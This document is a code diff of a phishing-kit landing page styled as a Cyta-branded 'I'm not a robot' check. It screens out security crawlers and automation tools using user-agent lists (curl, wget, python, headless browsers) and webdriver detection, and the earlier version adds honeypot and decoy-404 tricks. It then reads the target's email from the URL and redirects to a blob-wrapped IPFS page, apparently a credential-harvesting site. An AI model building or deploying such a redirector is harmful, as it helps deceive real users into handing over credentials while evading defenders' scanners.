@@ -1,222 +1,162 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Blob IPFS Redirect + Ultra Anti-Bot</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Human Verification</title>
 <style>
-html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
-
-/* Overlay with Cyta green background */
+/* FULLSCREEN OVERLAY */
 #overlay {
-    position:fixed; top:0; left:0; width:100%; height:100%;
-    background:#00875A;  /* Cyta-green background */
-    display:flex; align-items:center; justify-content:center;
-    opacity:0; transition:0.3s; z-index:999999;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 135, 90, 0.95);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
 }
-
-/* Verification box */
+/* VERIFICATION BOX */
 #verificationBox {
-    background:#fff;
-    padding:14px 18px;
-    border-radius:18px;
-    width:195px;
-    box-shadow:0 3px 10px rgba(0,0,0,0.10);
-    border:1px solid #dcdcdc;
-    text-align:left;
-    transition:0.25s;
+    width: 220px;
+    padding: 16px;
+    border-radius: 14px;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    border: 1px solid #dcdcdc;
+    text-align: left;
+    font-family: Arial, sans-serif;
+    position: relative;
 }
-
-#verificationBox:hover {
-    border-color:#3b82f6;
-    box-shadow:0 0 6px rgba(59,130,246,0.55);
+#verificationBox .header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
 }
-
-#verificationBox strong {
-    font-size:14px !important;
-}
-
-/* ROUND CHECKBOX WITH PULSE + BLINK */
-#checkbox {
-    width:18px;
-    height:18px;
-    border:2px solid #7f8fa6;
-    border-radius:50%;
-    cursor:pointer;
-    transition:0.25s;
-    position:relative;
-    background:#fff;
-    overflow:hidden;
-    animation:blinkPulse 2s infinite;
-}
-
-/* Slow blinking + pulse effect */
-@keyframes blinkPulse {
-    0%, 60%, 100% { box-shadow:0 0 0 rgba(127,143,166,0); }
-    30%, 90% { box-shadow:0 0 6px rgba(59,130,246,0.5); }
-}
-
-/* Ripple effect circle */
-#checkbox .ripple {
-    position:absolute;
-    width:6px;
-    height:6px;
-    background:rgba(0,150,255,0.5);
-    border-radius:50%;
-    transform:scale(0);
-    opacity:0;
-    animation:rippleAnim 0.45s ease-out forwards;
-}
-
-@keyframes rippleAnim {
-    0% { transform:scale(0.1); opacity:0.8; }
-    100% { transform:scale(8); opacity:0; }
-}
-
-/* Activated: green tick + glow */
-#checkbox.active {
-    background:#34a853;
-    border-color:#34a853;
-    box-shadow:0 0 12px rgba(52,168,83,0.6);
-    animation:none; /* stop blinking */
-}
-
-/* Checkmark animation */
-#checkbox.active::after {
-    content:"";
-    position:absolute;
-    left:5px;
-    top:2px;
-    width:5px;
-    height:10px;
-    border:2px solid white;
-    border-top:none;
-    border-left:none;
-    transform:rotate(45deg) scale(0);
-    animation:checkmarkIn 0.25s ease-out forwards;
-}
-
-@keyframes checkmarkIn {
-    0% { transform:rotate(45deg) scale(0); opacity:0; }
-    100% { transform:rotate(45deg) scale(1); opacity:1; }
-}
-
-/* Robot icon: slightly bigger, no bounce */
 #robotIcon {
-    width:24px;
-    height:24px;
-    border-radius:50%;
-    background:#e8f0fe;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:14px;
-    animation:botRotate 3s linear infinite;
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: #f8f9fa;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: #555;
+    transform: rotate(0deg);
+    transition: transform 0.05s linear;
 }
-
-@keyframes botRotate {
-    from {transform:rotate(0deg);}
-    to   {transform:rotate(360deg);}
+#verificationBox .header span {
+    font-size: 15px;
+    color: #333;
 }
-
-/* Verifying text */
-#verifying {
-    display:none; margin-top:8px; font-size:11px; color:#555;
+/* SLIDER */
+#sliderContainer {
+    width: 100%;
+    height: 32px;
+    background: #f1f3f4;
+    border-radius: 16px;
+    position: relative;
+    cursor: pointer;
+    overflow: hidden;
 }
-
+#sliderFill {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    background: #d2e7d5;
+    width: 0;
+    border-radius: 16px;
+    transition: width 0.1s;
+}
+#slider {
+    width: 32px;
+    height: 32px;
+    background: #34a853;
+    border-radius: 50%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 16px;
+    transition: left 0.1s;
+    z-index: 2;
+}
+#sliderText {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: none;
+    color: #555;
+    font-size: 14px;
+    transition: opacity 0.2s;
+}
+/* CHECKMARK */
+#checkmark {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    font-size: 18px;
+    color: #34a853;
+    pointer-events: none;
+    transition: transform 0.3s ease;
+}
+/* SPINNER */
 .spinner {
-    width:10px; height:10px; border-radius:50%;
-    border:2px solid #40739e; border-top-color:transparent;
-    animation:spin 0.6s linear infinite;
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    border: 2px solid #40739e;
+    border-top-color: transparent;
+    animation: spin 0.6s linear infinite;
 }
-
-@keyframes spin { from {transform:rotate(0deg);} to {transform:rotate(360deg);} }
-
-/* 404 PAGE */
-.error-404 {
-    display:flex; flex-direction:column; align-items:center; justify-content:center;
-    height:100vh; background:#f8f8f8; text-align:center;
+@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
+#verifying {
+    display: none;
+    margin-top: 10px;
+    font-size: 12px;
+    color: #555;
+    text-align: center;
 }
-.error-404 h1 { font-size:90px; margin:0; }
-.error-404 h2 { font-size:26px; margin=0; }
-.error-404 p  { font-size:18px; }
 </style>
 </head>
 <body>
 
-<!-- HUMAN VERIFICATION -->
 <div id="overlay">
     <div id="verificationBox">
-        <div style="display:flex; align-items:center; gap:8px;">
+        <div class="header">
             <div id="robotIcon">🤖</div>
-            <strong style="flex:1;">I'm not a robot</strong>
-            <div id="checkbox"></div>
+            <span>I'm not a robot</span>
+        </div>
+
+        <div id="sliderContainer">
+            <div id="sliderFill"></div>
+            <div id="slider">→</div>
+            <div id="sliderText">Slide to verify</div>
+            <div id="checkmark">✓</div>
         </div>
 
         <div id="verifying">
-            <div style="display:flex; align-items:center; gap:4px;">
-                <div class="spinner"></div> Verifying…
+            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
+                Verifying <div class="spinner"></div>
             </div>
         </div>
     </div>
 </div>
 
+<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
+
 <script>
-async function strongBotCheck() {
-    let score = 0;
-    const ua = navigator.userAgent.toLowerCase();
-    const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
-    if (botUA.some(x => ua.includes(x))) score += 40;
-    if (navigator.webdriver) score += 40;
-
-    try { const canvas = document.createElement("canvas"); if (!canvas.getContext("webgl")) score += 20; } catch { score += 20; }
-    try { const ctx = new (window.AudioContext || window.webkitAudioContext)(); if (ctx.sampleRate < 30000) score += 10; } catch { score += 10; }
-
-    if (screen.width < 700 || screen.height < 500) score += 10;
-    if (window.outerWidth === 0) score += 20;
-
-    let screenChanges = 0;
-    window.addEventListener("resize", () => screenChanges++);
-    setTimeout(() => { if (screenChanges > 5) score += 15; if (screenChanges === 0 && screen.width > 1024) score += 10; }, 1200);
-
-    const claimedTouch = navigator.maxTouchPoints > 0;
-    let realTouchEvents = 0;
-    window.addEventListener("touchstart", () => realTouchEvents++);
-    window.addEventListener("touchmove", () => realTouchEvents++);
-    setTimeout(() => { if (claimedTouch && realTouchEvents === 0) score += 25; }, 800);
-
-    const honeypot = document.createElement("input");
-    honeypot.type = "text";
-    honeypot.style.position = "absolute";
-    honeypot.style.left = "-9999px";
-    honeypot.style.top = "-9999px";
-    honeypot.style.opacity = "0";
-    honeypot.style.pointerEvents = "none";
-    document.body.appendChild(honeypot);
-    setTimeout(() => { if (honeypot.value.length > 0) score += 40; }, 400);
-
-    const ghost = document.createElement("button");
-    ghost.style.position = "absolute";
-    ghost.style.left = "120px";
-    ghost.style.top = "120px";
-    ghost.style.opacity = "0";
-    ghost.style.pointerEvents = "none";
-    document.body.appendChild(ghost);
-    document.addEventListener("click", e => { if (e.target === ghost) score += 40; });
-
-    let movements = 0;
-    window.addEventListener("mousemove", () => movements++);
-    window.addEventListener("touchmove", () => movements++);
-    await new Promise(r => setTimeout(r, 700));
-    if (movements < 3) score += 40;
-
-    const challenge = Math.random().toString(36).substring(2);
-    try { await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge)); } catch { score += 20; }
-
-    return score >= 60;
-}
-
-const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev/";
+// IPFS URL
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
 function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
 function createBlobHTML(url) {
@@ -226,54 +166,99 @@ function createBlobHTML(url) {
     </style></head><body><iframe src="${url}"></iframe></body></html>`;
 }
 
-function requireVerification() {
-    return new Promise(resolve => {
-        const overlay = document.getElementById("overlay");
-        const checkbox = document.getElementById("checkbox");
-        const verifying = document.getElementById("verifying");
-
-        overlay.style.opacity = 1;
-
-        checkbox.onclick = (e) => {
-            const ripple = document.createElement("div");
-            ripple.classList.add("ripple");
-            ripple.style.left = (e.offsetX - 3) + "px";
-            ripple.style.top  = (e.offsetY - 3) + "px";
-            checkbox.appendChild(ripple);
-            setTimeout(() => ripple.remove(), 450);
-
-            checkbox.classList.add("active");
-            verifying.style.display = "block";
-
-            setTimeout(() => {
-                overlay.style.opacity = 0;
-                setTimeout(() => overlay.remove(), 300);
-                resolve(true);
-            }, 900);
-        };
-    });
+// BOT CHECK
+function computeBotScore() {
+    let score = 0;
+    const ua = navigator.userAgent.toLowerCase();
+    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
+    if (navigator.webdriver) score += 50;
+    return score;
 }
 
-function show404() {
-    document.body.innerHTML = `<div class="error-404">
-        <h1>404</h1>
-        <h2>Error</h2>
-        <p>The requested page could not be found.</p>
-    </div>`;
+// ROBOT ROTATION
+let robotRotation = 0;
+const robotIcon = document.getElementById("robotIcon");
+let rotationSpeed = 1; // faster idle rotation
+function rotateRobot() {
+    robotRotation += rotationSpeed;
+    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
+    requestAnimationFrame(rotateRobot);
 }
+rotateRobot();
 
-document.addEventListener("DOMContentLoaded", async () => {
-    if (await strongBotCheck()) { show404(); return; }
-    await requireVerification();
-    const email = getEmail();
-    const url = buildIPFS(email);
-    const blobHTML = createBlobHTML(url);
-    const blob = new Blob([blobHTML], { type:"text/html" });
-    const blobURL = URL.createObjectURL(blob);
-    window.location.href = blobURL;
+// SLIDER
+const slider = document.getElementById("slider");
+const sliderContainer = document.getElementById("sliderContainer");
+const sliderText = document.getElementById("sliderText");
+const sliderFill = document.getElementById("sliderFill");
+const verifying = document.getElementById("verifying");
+const overlay = document.getElementById("overlay");
+const checkmark = document.getElementById("checkmark");
+const beepSound = document.getElementById("beepSound");
+
+let isDragging = false;
+let startX = 0;
+let beepPlayed = false;
+
+slider.addEventListener("mousedown", e => { 
+    if (!isDragging) {
+        isDragging = true; 
+        startX = e.clientX - slider.offsetLeft;
+        rotationSpeed = 5; // fast rotation while dragging
+
+        // Play beep immediately on user interaction
+        if (!beepPlayed) {
+            beepPlayed = true;
+            beepSound.currentTime = 0;
+            beepSound.play().catch(()=>{});
+        }
+    }
+});
+document.addEventListener("mousemove", e => {
+    if (!isDragging) return;
+    let x = e.clientX - startX;
+    if (x < 0) x = 0;
+    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
+    slider.style.left = x + "px";
+    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
+    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
+});
+document.addEventListener("mouseup", e => {
+    if (!isDragging) return;
+    isDragging = false;
+    rotationSpeed = 1; // back to idle speed
+
+    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
+        const botScore = computeBotScore();
+        if (botScore >= 60) {
+            alert("Suspicious activity detected.");
+            slider.style.left = "0px";
+            sliderFill.style.width = "0px";
+            sliderText.style.opacity = 1;
+            return;
+        }
+
+        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
+        slider.style.display = "none";
+        sliderText.style.opacity = 0;
+        verifying.style.display = "block";
+
+        setTimeout(() => {
+            overlay.style.display = "none";
+            const email = getEmail();
+            const ipfsURL = buildIPFS(email);
+            const blobHTML = createBlobHTML(ipfsURL);
+            const blob = new Blob([blobHTML], { type: "text/html" });
+            const blobURL = URL.createObjectURL(blob);
+            window.location.href = blobURL;
+        }, 800); 
+    } else {
+        slider.style.left = "0px";
+        sliderFill.style.width = "0px";
+        sliderText.style.opacity = 1;
+    }
 });
 </script>
 
 </body>
 </html>
-
